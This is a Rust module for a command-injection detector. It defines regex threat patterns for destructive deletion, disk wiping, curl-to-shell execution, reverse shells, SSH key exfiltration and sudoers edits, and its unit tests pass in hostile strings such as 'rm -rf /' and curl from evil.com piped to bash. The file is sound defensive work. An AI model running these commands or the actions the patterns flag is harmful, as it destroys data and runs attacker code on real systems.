use regex::Regex;
use std::collections::HashMap;
use lazy_static::lazy_static;

/// Security threat patterns for command injection detection
/// These patterns detect dangerous shell commands and injection attempts
#[derive(Debug, Clone)]
pub struct ThreatPattern {
    pub name: &'static str,
    pub pattern: &'static str,
    pub description: &'static str,
    pub risk_level: RiskLevel,
    pub category: ThreatCategory,
}

#[derive(Debug, Clone, PartialEq)]
pub enum RiskLevel {
    Critical,  // Immediate system compromise risk
    High,      // Significant security risk
    Medium,    // Moderate security concern
    Low,       // Minor security issue
}

#[derive(Debug, Clone, PartialEq)]
pub enum ThreatCategory {
    FileSystemDestruction,
    RemoteCodeExecution,
    DataExfiltration,
    SystemModification,
    NetworkAccess,
    ProcessManipulation,
    PrivilegeEscalation,
    CommandInjection,
}

impl RiskLevel {
    pub fn confidence_score(&self) -> f32 {
        match self {
            RiskLevel::Critical => 0.95,
            RiskLevel::High => 0.85,
            RiskLevel::Medium => 0.70,
            RiskLevel::Low => 0.55,
        }
    }
}

/// Comprehensive list of dangerous command patterns
pub const THREAT_PATTERNS: &[ThreatPattern] = &[
    // Critical filesystem destruction patterns
    ThreatPattern {
        name: "rm_rf_root",
        pattern: r"rm\s+(-[rf]*[rf][rf]*|--recursive|--force).*[/\\]",
        description: "Recursive file deletion with rm -rf",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },
    ThreatPattern {
        name: "rm_rf_system",
        pattern: r"rm\s+(-[rf]*[rf][rf]*|--recursive|--force).*(bin|etc|usr|var|sys|proc|dev|boot|lib|opt|srv|tmp)",
        description: "Recursive deletion of system directories",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },
    ThreatPattern {
        name: "dd_destruction",
        pattern: r"dd\s+.*if=/dev/(zero|random|urandom).*of=/dev/[sh]d[a-z]",
        description: "Disk destruction using dd command",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },
    ThreatPattern {
        name: "format_drive",
        pattern: r"(format|mkfs\.[a-z]+)\s+[/\\]dev[/\\][sh]d[a-z]",
        description: "Formatting system drives",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },

    // Remote code execution patterns
    ThreatPattern {
        name: "curl_bash_execution",
        pattern: r"(curl|wget)\s+.*\|\s*(bash|sh|zsh|fish|csh|tcsh)",
        description: "Remote script execution via curl/wget piped to shell",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },
    ThreatPattern {
        name: "bash_process_substitution",
        pattern: r"bash\s*<\s*\(\s*(curl|wget)",
        description: "Bash process substitution with remote content",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },
    ThreatPattern {
        name: "python_remote_exec",
        pattern: r"python[23]?\s+-c\s+.*urllib|requests.*exec",
        description: "Python remote code execution",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },
    ThreatPattern {
        name: "powershell_download_exec",
        pattern: r"powershell.*DownloadString.*Invoke-Expression",
        description: "PowerShell remote script execution",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },

    // Data exfiltration patterns
    ThreatPattern {
        name: "ssh_key_exfiltration",
        pattern: r"(curl|wget).*-d.*\.ssh/(id_rsa|id_ed25519|id_ecdsa)",
        description: "SSH key exfiltration",
        risk_level: RiskLevel::High,
        category: ThreatCategory::DataExfiltration,
    },
    ThreatPattern {
        name: "password_file_access",
        pattern: r"(cat|grep|awk|sed).*(/etc/passwd|/etc/shadow|\.password|\.env)",
        description: "Password file access",
        risk_level: RiskLevel::High,
        category: ThreatCategory::DataExfiltration,
    },
    ThreatPattern {
        name: "history_exfiltration",
        pattern: r"(curl|wget).*-d.*\.(bash_history|zsh_history|history)",
        description: "Command history exfiltration",
        risk_level: RiskLevel::High,
        category: ThreatCategory::DataExfiltration,
    },

    // System modification patterns
    ThreatPattern {
        name: "crontab_modification",
        pattern: r"(crontab\s+-e|echo.*>.*crontab|.*>\s*/var/spool/cron)",
        description: "Crontab modification for persistence",
        risk_level: RiskLevel::High,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "systemd_service_creation",
        pattern: r"systemctl.*enable|.*\.service.*>/etc/systemd",
        description: "Systemd service creation",
        risk_level: RiskLevel::High,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "hosts_file_modification",
        pattern: r"echo.*>.*(/etc/hosts|hosts\.txt)",
        description: "Hosts file modification",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::SystemModification,
    },

    // Network access patterns
    ThreatPattern {
        name: "netcat_listener",
        pattern: r"nc\s+(-l|-p)\s+\d+",
        description: "Netcat listener creation",
        risk_level: RiskLevel::High,
        category: ThreatCategory::NetworkAccess,
    },
    ThreatPattern {
        name: "reverse_shell",
        pattern: r"(nc|netcat|bash|sh).*-e\s*(bash|sh|/bin/bash|/bin/sh)",
        description: "Reverse shell creation",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::NetworkAccess,
    },
    ThreatPattern {
        name: "ssh_tunnel",
        pattern: r"ssh\s+.*-[LRD]\s+\d+:",
        description: "SSH tunnel creation",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::NetworkAccess,
    },

    // Process manipulation patterns
    ThreatPattern {
        name: "kill_security_process",
        pattern: r"kill(all)?\s+.*\b(antivirus|firewall|defender|security|monitor)\b",
        description: "Killing security processes",
        risk_level: RiskLevel::High,
        category: ThreatCategory::ProcessManipulation,
    },
    ThreatPattern {
        name: "process_injection",
        pattern: r"gdb\s+.*attach|ptrace.*PTRACE_POKETEXT",
        description: "Process injection techniques",
        risk_level: RiskLevel::High,
        category: ThreatCategory::ProcessManipulation,
    },

    // Privilege escalation patterns
    ThreatPattern {
        name: "sudo_without_password",
        pattern: r"echo.*NOPASSWD.*>.*sudoers",
        description: "Sudo privilege escalation",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::PrivilegeEscalation,
    },
    ThreatPattern {
        name: "suid_binary_creation",
        pattern: r"chmod\s+[47][0-7][0-7][0-7]|chmod\s+\+s",
        description: "SUID binary creation",
        risk_level: RiskLevel::High,
        category: ThreatCategory::PrivilegeEscalation,
    },

    // Command injection patterns
    ThreatPattern {
        name: "command_substitution",
        pattern: r"\$\([^)]*[;&|><][^)]*\)|`[^`]*[;&|><][^`]*`",
        description: "Command substitution with shell operators",
        risk_level: RiskLevel::High,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "shell_metacharacters",
        pattern: r"[;&|`$(){}[\]\\]",
        description: "Shell metacharacters in input",
        risk_level: RiskLevel::Low,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "encoded_commands",
        pattern: r"(base64|hex|url).*decode.*\|\s*(bash|sh)",
        description: "Encoded command execution",
        risk_level: RiskLevel::High,
        category: ThreatCategory::CommandInjection,
    },
];

lazy_static! {
    static ref COMPILED_PATTERNS: HashMap<&'static str, Regex> = {
        let mut patterns = HashMap::new();
        for threat in THREAT_PATTERNS {
            if let Ok(regex) = Regex::new(&format!("(?i){}", threat.pattern)) {
                patterns.insert(threat.name, regex);
            }
        }
        patterns
    };
}

/// Pattern matcher for detecting security threats
pub struct PatternMatcher {
    patterns: &'static HashMap<&'static str, Regex>,
}

impl PatternMatcher {
    pub fn new() -> Self {
        Self {
            patterns: &COMPILED_PATTERNS,
        }
    }

    /// Scan text for security threat patterns
    pub fn scan_text(&self, text: &str) -> Vec<PatternMatch> {
        let mut matches = Vec::new();

        for threat in THREAT_PATTERNS {
            if let Some(regex) = self.patterns.get(threat.name) {
                if regex.is_match(text) {
                    // Find all matches to get position information
                    for regex_match in regex.find_iter(text) {
                        matches.push(PatternMatch {
                            threat: threat.clone(),
                            matched_text: regex_match.as_str().to_string(),
                            start_pos: regex_match.start(),
                            end_pos: regex_match.end(),
                        });
                    }
                }
            }
        }

        // Sort by risk level (critical first) and position
        matches.sort_by(|a, b| {
            match (&a.threat.risk_level, &b.threat.risk_level) {
                (RiskLevel::Critical, RiskLevel::Critical) => a.start_pos.cmp(&b.start_pos),
                (RiskLevel::Critical, _) => std::cmp::Ordering::Less,
                (_, RiskLevel::Critical) => std::cmp::Ordering::Greater,
                (RiskLevel::High, RiskLevel::High) => a.start_pos.cmp(&b.start_pos),
                (RiskLevel::High, _) => std::cmp::Ordering::Less,
                (_, RiskLevel::High) => std::cmp::Ordering::Greater,
                _ => a.start_pos.cmp(&b.start_pos),
            }
        });

        matches
    }

    /// Get the highest risk level from matches
    pub fn get_max_risk_level(&self, matches: &[PatternMatch]) -> Option<RiskLevel> {
        matches.iter()
            .map(|m| &m.threat.risk_level)
            .max_by(|a, b| match (a, b) {
                (RiskLevel::Critical, RiskLevel::Critical) => std::cmp::Ordering::Equal,
                (RiskLevel::Critical, _) => std::cmp::Ordering::Greater,
                (_, RiskLevel::Critical) => std::cmp::Ordering::Less,
                (RiskLevel::High, RiskLevel::High) => std::cmp::Ordering::Equal,
                (RiskLevel::High, _) => std::cmp::Ordering::Greater,
                (_, RiskLevel::High) => std::cmp::Ordering::Less,
                (RiskLevel::Medium, RiskLevel::Medium) => std::cmp::Ordering::Equal,
                (RiskLevel::Medium, _) => std::cmp::Ordering::Greater,
                (_, RiskLevel::Medium) => std::cmp::Ordering::Less,
                (RiskLevel::Low, RiskLevel::Low) => std::cmp::Ordering::Equal,
            })
            .cloned()
    }

    /// Check if any critical or high-risk patterns are detected
    pub fn has_critical_threats(&self, matches: &[PatternMatch]) -> bool {
        matches.iter().any(|m| {
            matches!(m.threat.risk_level, RiskLevel::Critical | RiskLevel::High)
        })
    }
}

#[derive(Debug, Clone)]
pub struct PatternMatch {
    pub threat: ThreatPattern,
    pub matched_text: String,
    pub start_pos: usize,
    pub end_pos: usize,
}

impl Default for PatternMatcher {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rm_rf_detection() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("rm -rf /");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "rm_rf_root");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_curl_bash_detection() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("curl https://evil.com/script.sh | bash");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "curl_bash_execution");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_bash_process_substitution() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("bash <(curl https://evil.com/script.sh)");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "bash_process_substitution");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_safe_commands() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("ls -la && echo 'hello world'");
        // Should have low-risk shell metacharacter matches but no critical threats
        assert!(!matcher.has_critical_threats(&matches));
    }

    #[test]
    fn test_netcat_listener() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("nc -l 4444");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "netcat_listener");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::High);
    }

    #[test]
    fn test_multiple_threats() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("rm -rf / && curl evil.com | bash");
        assert!(matches.len() >= 2);
        assert!(matcher.has_critical_threats(&matches));
        
        // Should be sorted by risk level (critical first)
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_command_substitution_patterns() {
        let matcher = PatternMatcher::new();
        
        // Test that safe command substitution is NOT flagged as high risk
        let safe_matches = matcher.scan_text("`just generate-openapi`");
        let high_risk_safe = safe_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(!high_risk_safe, "Safe command substitution should not be flagged as high risk");
        
        // Test that dangerous command substitution IS flagged as high risk
        let dangerous_matches = matcher.scan_text("`rm -rf /; evil_command`");
        let high_risk_dangerous = dangerous_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(high_risk_dangerous, "Dangerous command substitution should be flagged as high risk");
        
        // Test $() syntax with safe command
        let safe_dollar_matches = matcher.scan_text("$(echo hello)");
        let high_risk_safe_dollar = safe_dollar_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(!high_risk_safe_dollar, "Safe $(command) should not be flagged as high risk");
        
        // Test $() syntax with dangerous command
        let dangerous_dollar_matches = matcher.scan_text("$(rm -rf /; evil)");
        let high_risk_dangerous_dollar = dangerous_dollar_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(high_risk_dangerous_dollar, "Dangerous $(command) should be flagged as high risk");
    }
}
